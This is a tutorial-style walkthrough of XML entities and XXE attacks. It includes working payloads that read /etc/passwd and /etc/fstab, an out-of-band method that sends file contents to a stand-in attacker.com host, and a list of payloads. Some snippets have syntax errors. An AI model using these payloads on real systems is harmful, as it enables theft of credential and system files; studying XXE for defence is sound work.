
**XML** or **eXtensible Markup Language** as the HTML also are a **Markup Language** that can be used to fetch data from an API, Config files, UI Layouts & Styles, RSS feeds and much more applications, see the follow example of a common XML file.

```xml
<?xml version="1.0"?>
<Person>
    <Name>Luiz</Name>
    <Age>25</Age>
</Person>
```

A concept that the XML utilize is the **Entities** that look like variables but was defined on XML and as the variables can store data, to define an entity we need use a DTD (Document Type Definition), and inside of them define an entity that is capable to storage data from a sensitive file for example, we have three main kind of entities.

- **General:** That can be and stores a simple value, like the example.
```xml
<?xml version="1.0"?>

<!DOCTYPE Person [           |
	<!ENTITY name "Sera">    | - DTD Definition with an entity in.
]>                           |

<Person>
    <Name>&name;</Name>
</Person>

```

-  **Parameter:** Only can be defined inside a DTD, and how you could see that's an entity inside of another.

```xml
<!DOCTYPE EntityDefine [
	<!ENTITY % another "<!ENTITY inner 'Leon'>">
	%another
]>

<Person>
    <Name>
        &inner;
    </Name>
</Person>
```

- **Predefined:** Simple entities defined to take a way to use a illegal resource for example without break the application.

```xml
<Hello>H&#x3C;llo</Hello> -> Doesn't Break
<Hello>H<llo</Hello> -> Breaks the Interpreter
```

---

Now about the **XXE** or **XML External Entity** it abuses of the possibility of an Entity also could read both from a local file on the machine or a remote file via URL, this can leads since the read the **/etc/passwd** through causes some XSS remotely or lead other kind of vulnerabilities.

About to read from a local file, we can use the keyword **SYSTEM** in an entity definition, follow the example:

```xml
<?xml version="1.0"?>

<!DOCTYPE XXE [
	<!ENTITY dataFromFile SYSTEM "/etc/passwd">
]>

<pwn>&dataFromFile;</pwn>
```

Now using the Entity to make a web request and catch the data from a.txt file on a web server.

```xml
<?xml version="1.0"?>

<!DOCTYPE XXE [
	<!ENTITY dataFromWeb SYSTEM "http://local.com/salve.txt">
]>

<pwn>&dataFromWeb;</pwn>
```

Resuming... all data from now.

```xml
<?xml version="1.0"?>

<!DOCTYPE XXE1 [
	<!ENTITY dataFromFile SYSTEM "localFile.txt">
	<!ENTITY dataFromWeb SYSTEM "http://local.com/salve.txt">
]>

<showFile>dataFromFile;</showFile>
<showWeb>dataFromWeb;</showWeb>

```

---

SYSTEM keyword understood... we also could define an Entity inside an entity, but here we have a little specification about the XML, we simply can define a DTD and reuse them in the same XML file, so to "Bypass" that we need to create a **evil.xml** and remotely pull that from our malicious web server and call the evil entity inside them.

1. Make a web request with an XML that make other web request to our malicious web server with **evil.dtd** file and follow call them

```xml
<!--Example of a payload to make the ITEM 1-->

<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.xml">

<data>&send;</data>
```

2. On our **evil.xml** you can put the follow payload

```xml
<!-- evil.xml file -->
<?xml version="1.0"?>
<!DOCTYPE NameDTD[
    <!ENTITY % pass SYSTEM "file:///etc/passwd">
    <!ENTITY % wrap SYSTEM "<!ENTITY send SYSTEM 'http://attacker.com/?%pass'>">
    %wrap
]>
```

3. After all this you can start your evil web server with ```python3 -m http.server 80``` and send the **item 1** to pull our **evil.xml** and finally pull the */etc/passwd*.
---
#### Some nice payloads for evil.xml
```xml
<?xml version="1.0"?>
<!DOCTYPE XXE2 [
    <!ENTITY % dataFromEntity "<!ENTITY dataFromFile SYSTEM 'system.txt'>">
    %dataFromEntity;
]>

<showData>&dataFromFile;</showData>

------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE Pwn[
	<!ENTITY % passwd SYSTEM 'file:///etc/passwd'>
	<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd'>">
	%wrapper;

]>

<sendRequest>&send;</sendRequest>
```

Have some contexts that we simply couldn't read the data because the interpreter will break, the reason about that is the data from file extracted... it could contain "<>" that can lead a break interpreting and consequently break the request, to fix/bypass this issue we can use a reserved entity called "CDATA" on xml, CDATA means "Character Data" and simply doesn't interpret the tags, check the follow example.

```xml
<!-- <![CDATA [<text></text>]] --> <!-- Doesn't will interpret the tags -->

<?xml version='1.0'?>
<!DOCTYPE OutOfBox [
	<!ENTITY % start "<![CDATA[">
	<!ENTITY % file SYSTEM "file:///etc/fstab"> 
	<!ENTITY % end "]]>">
	
	<!ENTITY % wrapper "<!ENTITY all '&start;&file;&end;'>">
	&wrapper;
]>

<OutOfBox>&all;</OutOfBox>
```


